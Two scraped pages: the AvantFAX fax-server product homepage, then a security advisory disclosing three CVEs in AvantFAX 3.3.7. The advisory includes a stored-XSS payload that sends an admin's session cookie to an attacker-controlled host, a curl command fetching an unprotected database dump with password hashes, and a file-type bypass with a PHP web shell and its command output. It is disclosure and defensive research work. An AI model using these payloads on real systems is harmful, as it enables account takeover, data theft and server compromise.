=== Content from avantfax.com_4ec4580d_20250114_211658.html ===

[![avantfax logo](img/avantfax.png)](/)

|  | HylaFAX Enterprise | |  |
| --- | --- | --- | --- |
| * T.38 Fax over IP (FoIP) * Web Interface * Database Back-end | * Virtualization * Desktop Faxing |

* [Home](/)
* [Download](download.php)
* [FAQ](faq.php)* [Install](install.php)
  * [Screenshots](screenshots.php)
  * [Support](support.php)
  * [Contact](contact-us.php)

[» AvantFAX & HylaFAX](hylafax.php)
[» Changelog](changelog.php)
[» Contributing](contributing.php)
[» Configuring Apache](configure-apache.php)
[» Development](development.php)
[» Document Management](document-management.php)
[» Download](download.php)
[» Fax Processing](fax-processing.php)
[» faxcover](faxcover.php)
[» Installation](install.php)
[» Languages](languages.php)
[» OCR Support](ocr-support.php)
[» Screenshots](screenshots.php)
[» Support](support.php)
[» Testimonials](testimonials.php)
[» Upgrading](upgrading.php)

News

[02.21.2023]
» AvantFAX 3.4.0 Released

[08.11.2020]
» AvantFAX 3.3.7 Released

Newsletter

# What is AvantFAX?

[![AvantFAX Screenshot](/img/screenshots/avantfax-sm.png "AvantFAX Screenshot")](screenshots.php)

AvantFAX® is a [web application](http://en.wikipedia.org/wiki/Web_application) for managing faxes on [HylaFAX](http://www.hylafax.org)™ fax servers.

AvantFAX allows users on any platform to **view and send faxes without having to install special software**. It also allows administrators to manage users, their permissions, fax lines, fax categories, etc.

AvantFAX can be accessed from the local network and remotely via Internet using standard networking equipment.

## Why should my company/organization be interested?

AvantFAX is **open source** and is released under the [GNU General Public License](http://www.gnu.org/copyleft/gpl.html) just like Linux and HylaFAX.

* Do you have multiple users who need to use the fax machine?
* Do you need an efficient way to [archive and search](document-management.php) your sent and received faxes?
* Do you need a system that is robust enough to handle multiple fax lines and thousands of faxes without ''crashing''?
* Do you need to fax the same document to multiple recipients?
* Do you need a solution that you can customize and integrate into your document workflow?

If you've answered yes, AvantFAX is definitely what you're looking for. Also, [commercial support and custom installations](support.php) are available.

## Features

* Users can view faxes online with any standard web browser (IE6/7, Mozilla/Firefox, Safari, and Opera)
* Download your faxes in PDF format
* Recognizable fax numbers can have their faxes forwarded directly to an email address in PDF format
* Users can forward faxes via email without the need of an email client
* Enhanced [cover page](faxcover.php) support for HylaFAX
* Theme support (using Smarty) (AvantFAX 3.x series)
* Unlimited users
* Unlimited fax lines - the number of fax lines managed by AvantFAX is not limited
* Email to FAX support
* Blacklisting support using DynamicConfig RejectCall
* Barcode based routing (requires HylaFAX EE 3)
* DID/DTMF-based routing support
* [OCR support](ocr-support.php) (using Tesseract) for improved keyword searching (AvantFAX 3.0.2+)
* Address book importer for both Email addresses and Fax numbers in vCard (.vcf) format
* Multiple [language](languages.php) support - each user can use the interface in their native language
* ![AvantFAX Archive](/img/firefox-search.jpg)Fax archive - search your fax archive for received and sent faxes by company, date, category, and keyword.

## Advantages

* Easily monitor and log what your users are faxing and to where
* Faxes are stored in PDF format instead of a proprietary file format
* Users on any platform use the same identical interface
* Faxes are archived on the server instead of in filing cabinets
* Eliminates multiple fax machines in a single facility
* Send faxes directly from your computer with email confirmation
* Reduces paper and toner use in both the fax machine and office printer
* Online address book helps reduce human input error

**Have questions?** Contact .

AvantFAX® is a registered trademark of [iFAX Solutions, Inc](http://www.ifax.com).

HylaFAX™ a trademark of Silicon Graphics, Inc.

[![t38fax](/img/t38fax-leaderboard-728x90.png)](https://www.t38fax.com)

[Home](/)
[Download](/download.php)
[Install](/install.php)
[Screenshots](/screenshots.php)

[Support](/support.php)
[Testimonials](/testimonials.php)

[√ W3C](http://validator.w3.org/check?uri=referer)

© 2017 AvantFAX.com



=== Content from github.com_2517462d_20250114_211659.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsuperkojiman%2Fvulnerabilities%2Fblob%2Fmaster%2FAvantFAX-3.3.7%2FREADME.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsuperkojiman%2Fvulnerabilities%2Fblob%2Fmaster%2FAvantFAX-3.3.7%2FREADME.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=superkojiman%2Fvulnerabilities)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[superkojiman](/superkojiman)
/
**[vulnerabilities](/superkojiman/vulnerabilities)**
Public

* [Notifications](/login?return_to=%2Fsuperkojiman%2Fvulnerabilities) You must be signed in to change notification settings
* [Fork
  21](/login?return_to=%2Fsuperkojiman%2Fvulnerabilities)
* [Star
   55](/login?return_to=%2Fsuperkojiman%2Fvulnerabilities)

* [Code](/superkojiman/vulnerabilities)
* [Issues
  0](/superkojiman/vulnerabilities/issues)
* [Pull requests
  0](/superkojiman/vulnerabilities/pulls)
* [Actions](/superkojiman/vulnerabilities/actions)
* [Projects
  0](/superkojiman/vulnerabilities/projects)
* [Wiki](/superkojiman/vulnerabilities/wiki)
* [Security](/superkojiman/vulnerabilities/security)
* [Insights](/superkojiman/vulnerabilities/pulse)

Additional navigation options

* [Code](/superkojiman/vulnerabilities)
* [Issues](/superkojiman/vulnerabilities/issues)
* [Pull requests](/superkojiman/vulnerabilities/pulls)
* [Actions](/superkojiman/vulnerabilities/actions)
* [Projects](/superkojiman/vulnerabilities/projects)
* [Wiki](/superkojiman/vulnerabilities/wiki)
* [Security](/superkojiman/vulnerabilities/security)
* [Insights](/superkojiman/vulnerabilities/pulse)

## Files

 master
## Breadcrumbs

1. [vulnerabilities](/superkojiman/vulnerabilities/tree/master)
2. /[AvantFAX-3.3.7](/superkojiman/vulnerabilities/tree/master/AvantFAX-3.3.7)
/
# README.md

Copy path Blame  Blame
## Latest commit

## History

[History](/superkojiman/vulnerabilities/commits/master/AvantFAX-3.3.7/README.md)219 lines (151 loc) · 11.3 KB master
## Breadcrumbs

1. [vulnerabilities](/superkojiman/vulnerabilities/tree/master)
2. /[AvantFAX-3.3.7](/superkojiman/vulnerabilities/tree/master/AvantFAX-3.3.7)
/
# README.md

Top
## File metadata and controls

* Preview
* Code
* Blame

219 lines (151 loc) · 11.3 KB[Raw](https://github.com/superkojiman/vulnerabilities/raw/refs/heads/master/AvantFAX-3.3.7/README.md)
# Multiple Vulnerabilities in AvantFAX 3.3.7

AvantFAX is an open-source PHP web application designed for managing and sending faxes over the Internet. Users can send and receive faxes using a virtual fax machine connected to a server equipped with a fax modem, or fax server.

On November 2022, a researcher from [Cycura's](https://www.cycura.com) offensive security research team discovered three vulnerabilities affecting AvantFAX 3.3.7. Exploitation of these vulnerabilities may lead to administrator account takeover, sensitive information disclosure, and remote code execution.

1. [CVE-2023-23326](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23326): Session Hijacking via Authenticated Stored Cross-Site Scripting
2. [CVE-2023-23327](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23327): Unauthenticated Access to AvantFAX Backup Fax Archive and Database
3. [CVE-2023-23328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23328): Remote Code Execution via PHP Arbitrary File Upload

Earlier releases of AvantFAX may also be affected by these vulnerabilities.

## Credit

The vulnerabilities were discovered by Cycura cyber security researcher [Harold Rodriguez](https://www.linkedin.com/in/haroldrodriguez/).

## Acknowledgement

Cycura would like to thank the AvantFAX team for their prompt acknowledgement of our report and willingness to work collaboratively to remediate the vulnerabilities. It is encouraging to see a company that takes cybersecurity seriously, and is committed to continuously improving their security practices.

## Disclosure Timeline

* November 11, 2022:
  + Discovered three vulnerabilities affecting AvantFAX 3.3.7.
* November 22, 2022:
  + Notified AvantFAX of the vulnerabilities and intent to publish our findings in accordance with our 90-day disclosure timeline policy.
  + AvantFAX acknowledged vulnerability report.
* January 10, 2023:
  + AvantFAX provided us with an updated release that addresses the vulnerabilities.
  + Requested CVEs from MITRE for the three vulnerabilities.
* January 11, 2023:
  + Verified that the updated release remediates the vulnerabilities.
* February 13, 2023:
  + Received CVE IDs for the three vulnerabilities.
  + Notified AvantFAX that the updates remediated the vulnerabilities and our intent to proceed with public disclosure after February 21, 2023.
* February 21, 2023:
  + AvantFAX releases version 3.4.0 which remediates the vulnerabilities.

## Remediation

The AvantFAX team has remediated these issues in AvantFAX 3.4.0. It is strongly recommended that users upgrade to the latest release available at <http://www.avantfax.com/>.

## CVE-2023-23326: Session Hijacking via Authenticated Stored Cross-Site Scripting

### Vulnerability Description

AvantFAX is vulnerable to Stored Cross-Site Scripting (XSS) in the user's email address field. An authenticated low privilege user account can exploit this vulnerability to steal an administrator's session cookie and hijack their session. When an administrator logs in to the /admin page, the XSS payload is executed immediately upon loading the admin dashboard.

### Proof of Concept

Host the following Javascript file x.js on a server we control; for example, 192.168.225.132.

```
var x = new Image;
x.src = 'http://192.168.225.132/cookie=' + document.cookie;

```

Authenticate to AvantFAX as a low privilege user, and set the user's email address to the following:

```
<script src="http://192.168.225.132/x.js"></script>

```

Save the changes, and log out.

Login as an administrator user. The dashboard will immediately load and execute the contents of x.js, which sends the administrator's session cookie to our server.

This can be verified by looking at the contents of our HTTP server logs and observing the administrator's session cookie:

```
192.168.225.1 - - [16/Nov/2022:15:47:28 -0500] "GET /x.js HTTP/1.1" 200 79 "http://192.168.225.131/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
192.168.225.1 - - [16/Nov/2022:15:47:28 -0500] "GET /cookie=AvantFAX=p4vvvp0tnesmao009u0l6lo422 HTTP/1.1" 404 125 "http://192.168.225.131/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"

```

## CVE-2023-23327: Unauthenticated Access to AvantFAX Backup Fax Archive and Database

### Vulnerability Description

Administrators can create and download a backup of the sent and received faxes, as well as the contents of the avantfax database. These files are stored in /avantfax/tmp with predictable names:

```
avantfax-archive-YYYYMMDD.tar.gz
avantfax-schema-YYYYMMDD.tar.gz

```

The code responsible for creating the file names can be found in admin/system\_func.php:

```
} elseif ($formdata->download_ar) {
		// download fax archive
		$basname        = "avantfax-archive-".date ("Ymd").".tar.gz";
		$tmpfile        = $TMPDIR.$basname;
		system ("tar -czf $tmpfile $ARCHIVE $ARCHIVE_SENT");
		header ("Location: ../tmp/$basname");
		exit;
} elseif ($formdata->download_db) {
		// download fax database dump
		$basname        = "avantfax-schema-".date ("Ymd").".sql.gz";
		$tmpfile        = $TMPDIR.$basname;
		system ("mysqldump --user=".AFDB_USER." --password=".AFDB_PASS." ".AFDB_NAME." | gzip -9 > $tmpfile");
		header ("Location: ../tmp/$basname");
		exit;
}

```

Due to its predictable naming convention, it is trivial for a user to brute force a range of dates and download these files. The archive files contain faxes that have been sent and received, and the schema files contain user accounts and their MD5 hashed passwords.

### Proof of Concept

Login as an administrator, go to the Systems Functions page and click on the Download Archive and Download Database buttons. These will create the avantfax-archive and avantfax-schema files appended with the current date in YYYYMMDD format.

Download the files as an unauthenticated user:

```
$ curl -s http://192.168.225.131/tmp/avantfax-schema-20221116.sql.gz | gunzip | grep 'INSERT INTO `UserAccount`'

INSERT INTO `UserAccount` VALUES (1,'AvantFAX Admin','admin','d1a714af4e450a88cb6eba85fdd93344','root@localhost','','','','','','',0,0,0,1,0,'2022-11-15 18:00:26','2022-11-16 18:57:07','192.168.225.1','en','','','','0000-00-00',0,0,1,0,1,0,1),(2,'Koji','koji','d1a714af4e450a88cb6eba85fdd93344','koji@test.local','','','','','','',2,25,30,0,0,'2022-11-16 16:04:40','2022-11-16 18:00:14','192.168.225.1','en','','','','0000-00-00',0,0,0,0,1,0,0);

```

## CVE-2023-23328: Remote Code Execution via PHP Arbitrary File Upload

### Vulnerability Description

AvantFAX does not properly validate uploaded files, which allows an authenticated user to upload PHP files with arbitrary code resulting in remote code execution.

The Send Fax page allows a user to upload documents to be faxed. File types are restricted to Postscript (.ps), PDF (.pdf), TIFF (.tiff), and text (.txt). Attempting to upload a PHP file called test.php with the following contents results in the application rejecting it:

```
<?php
print("Test");
?>

```

The user is presented with an error "File type is unauthorized (text/x-php)".

File type verification is performed using PHP’s mime\_content\_type() function which checks the contents of the file to determine its type. This check is done within the load\_file() function in includes/FileUpload.php:

```
// check mimetype
if (function_exists('mime_content_type')) {
		$this->mimetype = mime_content_type($this->tmpname);
} elseif (extension_loaded('fileinfo')) {
		$minfo = new finfo(FILEINFO_MIME);
		$this->mimetype = $minfo->file($this->tmpname);
} else {
		$this->mimetype = $file['type'];
}

```

When mime\_content\_type() checks test.php, it returns text/x-php. Since this is not in the allowed list of file types, the application returns a "File type is unauthorized" error.

However, if the contents were changed to include arbitrary text right before the <?php tag, the application accepts it:

```
This line bypasses the file-type check.
<?php
print("Test");
?>

```

This is because mime\_content\_type() returns text/plain which is an allowed file type.

Furthermore, the application does not check for file extensions, and accepts files that have a .php extension. This allows a user to upload PHP files containing arbitrary code that is executed when loaded.

The uploaded file is saved in /avantfax/tmp with 9 hexadecimal characters prepended to the file name. For example, our uploaded test.php file could be saved as ac0f129d8test.php.

The 9-character hexadecimal string is generated by the set\_randname() function in includes/FileUpload.php. However, this isn't actually random and is instead generated by taking the current time stamp, hashing it using MD5, and then taking the first 9 characters of that MD5 hash:

```
$this->filename = substr(md5(microtime()), 0, $n).$this->filename;

```

This allows us to predict possible 9-character hexadecimal strings if we know the time on the server, and then perform a brute force attack to try and find the name of the uploaded file. There are no access controls to protect the /avantfax/tmp directory, which allows unauthenticated users to load the PHP file and execute its contents once they have discovered its file name.

### Proof of Concept

We developed a PHP script to automate the exploitation process. It uploads a web shell to the server and records a time stamp of when the upload is completed. An arbitrary number is subtracted from the time stamp to establish a time period in the hope that one of those time stamps in that range will match the time stamp set\_randname() used to generate the file name.

In our test environment, subtracting 15,000 milliseconds from the time stamp provided a large enough range to cover the time stamp used by set\_randname().

Each time stamp is hashed using MD5, and the first 9 characters of the hash are prepended to the file name of our web shell. A request is made to the server for the updated file name, and if the web server returns a 200 HTTP response code, then we have found the web shell.

In this particular instance, it took approximately 40 seconds for the script to find the web shell on the server:

```
$ time php -e af_pwn.php
[+] Target: 192.168.225.131
[+] Payload:

This line bypasses the file-type check.
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>

[+] Uploading payload...
[+] Upload completed at: 0.28506400 1668789238
[+] Searching for webshell...
[+] Using time period 285064 to 270064
[+] Found webshell at http://192.168.225.131/tmp/e7ba68bcbtest.php
[+] Exploit using http://192.168.225.131/tmp/e7ba68bcbtest.php?cmd=id

real    40.85s
user    0.52s
sys     1.66s
cpu     5%

```

We are now able to execute commands on the server via the web shell and retrieve the output:

```
$ curl http://192.168.225.131/tmp/e7ba68bcbtest.php?cmd=id
This line bypasses the file-type check.
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

$ curl http://192.168.225.131/tmp/e7ba68bcbtest.php?cmd=uname+-a
This line bypasses the file-type check.
Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


